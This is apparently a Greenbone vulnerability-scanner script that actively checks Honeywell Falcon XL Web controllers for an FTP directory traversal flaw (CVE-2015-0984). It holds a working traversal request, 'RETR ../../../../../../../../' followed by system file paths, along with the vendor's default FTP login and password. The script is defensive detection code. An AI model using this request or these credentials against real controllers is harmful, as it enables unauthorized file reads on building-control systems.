# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/h:honeywell:xl_web_ii_controller";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805540");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2015-0984");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-04-27 10:42:16 +0530 (Mon, 27 Apr 2015)");

  script_name("Honeywell Falcon XL Web Controller Directory Traversal Vulnerability - Active Check");

  script_tag(name:"summary", value:"Honeywell Falcon XL Web Controller is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Flaw exists due to the FTP server not
  properly sanitizing user input, specifically path traversal style attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow
  remote attackers to read arbitrary files on the target system.");

  script_tag(name:"affected", value:"XL1000C50-EXCEL WEB 52 I/O before 2.04.01

  XL1000C100-EXCEL WEB 104 I/O before 2.04.01

  XL1000C500-EXCEL WEB 300 I/O before 2.04.01

  XL1000C1000-EXCEL WEB 600 I/O before 2.04.01

  XL1000C50U-EXCEL WEB 52 I/O UUKL before 2.04.01

  XL1000C100U-EXCEL WEB 104 I/O UUKL before 2.04.01

  XL1000C500U-EXCEL WEB 300 I/O UUKL before 2.04.01

  XL1000C1000U-EXCEL WEB 600 I/O UUKL before 2.04.01");

  script_tag(name:"solution", value:"Upgrade to EXCEL WEB to version 2.04.01 or later.");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Apr/79");
  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-15-076-02");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("FTP");
  script_dependencies("gb_honeywell_xlweb_consolidation.nasl", "logins.nasl");
  script_require_ports("Services/ftp", 21);
  script_mandatory_keys("honeywell/excel_web/detected");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("ftp_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("port_service_func.inc");

if (!port = get_app_port(cpe: CPE, service: "ftp"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

if(!soc1 = open_sock_tcp(port))
  exit(0);

kb_creds = ftp_get_kb_creds(default_login:"xwadmin", default_pass:"kisrum1!");
user = kb_creds["login"];
pass = kb_creds["pass"];

login_details = ftp_log_in(socket:soc1, user:user, pass:pass);

files = traversal_files("linux");

if (login_details) {
  ftpPort2 = ftp_get_pasv_port(socket:soc1);
  if (ftpPort2) {
    soc2 = open_sock_tcp(ftpPort2, transport:get_port_transport(port));
    if (soc2) {
      foreach pattern(keys(files)) {

        file = files[pattern];

        attackreq = "RETR ../../../../../../../../" + file;
        send(socket:soc1, data:string(attackreq, "\r\n"));
        attackres = ftp_recv_data(socket:soc2);
        if (attackres && egrep(string:attackres, pattern:pattern) && "xwadmin" >< attackres) {
          report = 'It was possible to obtain ' + file + '.\n\nResult:\n\n' + attackres;
          security_message(port:port, data:report);
          ftp_close(socket:soc1);
          close(soc1);
          close(soc2);
          exit(0);
        }
      }
      close(soc2);
    }
  }
  ftp_close(socket:soc1);
}

close(soc1);

exit(99);
